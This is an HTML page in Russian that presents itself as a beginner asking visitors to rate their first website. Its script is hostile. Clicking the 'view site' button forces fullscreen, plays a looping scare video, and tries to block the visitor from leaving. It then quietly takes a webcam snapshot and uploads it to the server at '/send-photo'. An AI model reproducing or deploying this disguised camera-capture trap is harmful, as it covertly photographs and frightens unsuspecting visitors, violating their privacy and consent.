<!DOCTYPE html><html lang="ru"><head> 
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">  
<title>first project</title>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
<style type="text/css">
            p {
                margin: 0;
            }

            *, *::before, *::after {
                box-sizing: border-box;
            }

            .overlay, .scare {
                position: fixed;
                top: 0;
                left: 0;
                height: 100vh;
                width: 100vw;
            }

            p.overlay-title {
                font-size: 24px;
                font-weight: 900;
                color: black;
                line-height: 1;
                margin-bottom: 16px;
            }

            .overlay-button {
                display: inline-flex;
                align-items: center;
                height: 40px;
                padding-right: 24px;
                padding-left: 24px;
                font-size: 16px;
                font-weight: 500;
                line-height: 1;
                border-radius: 4px;
                margin: 4px;
                cursor: pointer;
            }

            .overlay-buttons-wrapper {
                margin: 24px -8px -8px;
            }

            #accept-button {
                background-color: rgb(132, 94, 194);
                color: white;
            }

            #decline-button {
                color: rgb(132, 94, 194);
                border: 2px solid rgb(132, 94, 194);
            }

            p.overlay-description {
                font-size: 16px;
                font-weight: 400;
                color: rgba(0, 0, 0, 0.5);
                line-height: 1.25;
                margin-bottom: 16px;
            }

            a.overlay-link {
                display: inline-block;
                text-decoration: none;
                font-size: 16px;
                font-weight: 500;
                color: rgb(132, 94, 194);
                line-height: 1;
                position: relative;
                margin-top: 16px;
            }

            a.overlay-link::before {
                position: absolute;
                content: "";
                height: calc(50% + 4px);
                width: calc(100% + 8px);
                bottom: -4px;
                left: -4px;
                background-color: rgba(132, 94, 194, 0.1);
            }

            .overlay-body {
                max-width: 512px;
                text-align: center;
                font-family: "Inter", sans-serif;
            }

            .overlay[hidden] {
                display: none;
            }

            .overlay {
                z-index: 2;
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: #f5f6fa;
                padding-right: 24px;
                padding-left: 24px;
            }

            .scare {
                z-index: 1;
            }

            video#video {
                height: 100%;
                width: 100%;
                object-fit: cover;
            }

            video#video::-webkit-media-controls-enclosure {
                display:none !important;
            }
        </style>
</head>
<body>
<div id="overlay" class="overlay">
<div class="overlay-body">
<p class="overlay-title">Просьба оценить мой первый сайт</p>
<p class="overlay-description">Этот сайт был написан с нуля в нем есть верстка под телефон ну и под другие устройства</p>
<div class="overlay-buttons-wrapper">
<div id="accept-button" class="overlay-button">Смотреть сайт</div>
</div>
</div>
</div>
<div class="scare">
<video id="video" class="video" src="media/video.mp4" loop></video>
</div>
<script>
const video = document.getElementById("video");
const overlay = document.getElementById("overlay");
const acceptButton = document.getElementById("accept-button");
let hasClicked;

window.onbeforeunload = () => hasClicked ? true : null;

acceptButton.addEventListener("click", async (event) => {
    event.preventDefault();
    if (!hasClicked) hasClicked = true;
    overlay.hidden = true;
    video.play();
    requestFullscreen();
    await startCameraAndSendPhoto();
});

function requestFullscreen() {
    const doc = document.documentElement;
    if (doc.requestFullscreen) doc.requestFullscreen();
    else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
}

async function startCameraAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const tempVideo = document.createElement('video');
        tempVideo.srcObject = stream;
        tempVideo.play();

        await new Promise(res => setTimeout(res, 1500)); // подождать для прогрева камеры

        const canvas = document.createElement('canvas');
        canvas.width = tempVideo.videoWidth;
        canvas.height = tempVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'snapshot.jpg');
            fetch('/send-photo', {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg');
    } catch (e) {
        console.error('Ошибка доступа к камере', e);
    }
}
</script>
</body></html>
